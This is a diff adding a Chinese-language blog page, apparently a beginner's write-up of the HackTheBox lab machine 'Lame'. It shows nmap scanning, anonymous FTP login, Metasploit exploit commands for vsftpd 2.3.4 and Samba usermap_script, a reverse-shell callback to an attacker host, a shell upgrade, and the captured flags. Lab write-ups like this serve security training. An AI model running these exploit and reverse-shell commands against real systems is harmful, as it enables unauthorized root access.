@@ -1,0 +1,207 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>菜鸡打下的第一个靶机 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="因为第一次打靶机，挑了一个最简单Lame
+我们先nmap一下看看开了哪些端口
+12345678910root@kali:~# nmap 10.10.10.3Starting Nmap 7.80 ( ,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">菜鸡打下的第一个靶机</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">菜鸡打下的第一个靶机</h1>
+        <div class="stuff">
+            <span>十一月 29, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/HTB/" rel="tag">HTB</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>因为第一次打靶机，挑了一个最简单Lame</p>
+<p>我们先nmap一下看看开了哪些端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap 10.10.10.3</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-11-29 19:21 CST</span><br><span class="line">Nmap scan report for 10.10.10.3</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21&#x2F;tcp  open  ftp</span><br><span class="line">22&#x2F;tcp  open  ssh</span><br><span class="line">139&#x2F;tcp open  netbios-ssn</span><br><span class="line">445&#x2F;tcp open  microsoft-ds</span><br></pre></td></tr></table></figure>
+
+<p>从结果来看开了4个端口，我们一个一个开始试验</p>
+<p>先从第一个ftp开始，我暂时能想到的就是ftp匿名登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ftp 10.10.10.3</span><br><span class="line">Connected to 10.10.10.3.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (10.10.10.3:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">#看来是登陆成功了</span><br><span class="line">ftp&gt; pwd  #查看当前目录</span><br><span class="line">257 &quot;&#x2F;&quot;</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">226 Directory send OK.</span><br><span class="line">#没有看到任何文件，看来是做了限制</span><br></pre></td></tr></table></figure>
+
+<p>ftp匿名用户失败，看一下他ftp应用的版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21&#x2F;tcp  open  ftp         vsftpd 2.3.4 </span><br></pre></td></tr></table></figure>
+
+<p>感觉这个版本有点眼熟，到msf中搜一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftpd  </span><br><span class="line">0  exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution   </span><br></pre></td></tr></table></figure>
+
+<p>果然有对应的payload，那就直接用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;unix&#x2F;ftp&#x2F;vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; set rhost 10.10.10.3</span><br><span class="line">msf5 exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; run</span><br><span class="line">Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+
+<p>心态有点崩，又试了两次还是如此，放弃。接下来的ssh爆破，也没爆成功。只剩下最后的Samba了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script</span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; set payload cmd&#x2F;unix&#x2F;reverse</span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; set rport 445</span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; set rhost 10.10.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; set lhost 10.10.14.9</span><br><span class="line">msf5 exploit(multi&#x2F;samba&#x2F;usermap_script) &gt; run</span><br><span class="line">[*] Started reverse TCP double handler on 10.10.14.9:4444 </span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo OHyLWUdLE5bePJ7U;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: &quot;OHyLWUdLE5bePJ7U\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.9:4444 -&gt; 10.10.10.3:53443) at 2020-11-29 20:22:58 +0800</span><br></pre></td></tr></table></figure>
+
+<p>Yes弹回来会话了，但是获取的shell并不是一个具有完整交互的shell,所以我们用Python创建一个比较好用的终端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">root@lame:&#x2F;# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>Ohhhhhhh！root权限（为所欲为）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@lame:&#x2F;# cd root&#x2F;</span><br><span class="line">root@lame:&#x2F;root# ls</span><br><span class="line">Desktop  reset_logs.sh  root.txt  vnc.log</span><br><span class="line">root@lame:&#x2F;root# cat root.txt</span><br><span class="line">77ae0a4afb2f1087bb38c7f6b9eb825f</span><br></pre></td></tr></table></figure>
+
+<p>知道flag的格式就好找了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@lame:&#x2F;# find &#x2F; -name &quot;*.txt&quot;</span><br><span class="line">&#x2F;home&#x2F;makis&#x2F;user.txt</span><br><span class="line">root@lame:&#x2F;# cat &#x2F;home&#x2F;makis&#x2F;user.txt</span><br><span class="line">cat &#x2F;home&#x2F;makis&#x2F;user.txt</span><br><span class="line">0828807ae8ece72ceefa31c2e55e332a</span><br></pre></td></tr></table></figure>
+
+<p>完美~~~~</p>
+<p><img src="https://i.loli.net/2020/11/29/f1jlmuRCyiGFxpO.png" alt="1.png"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
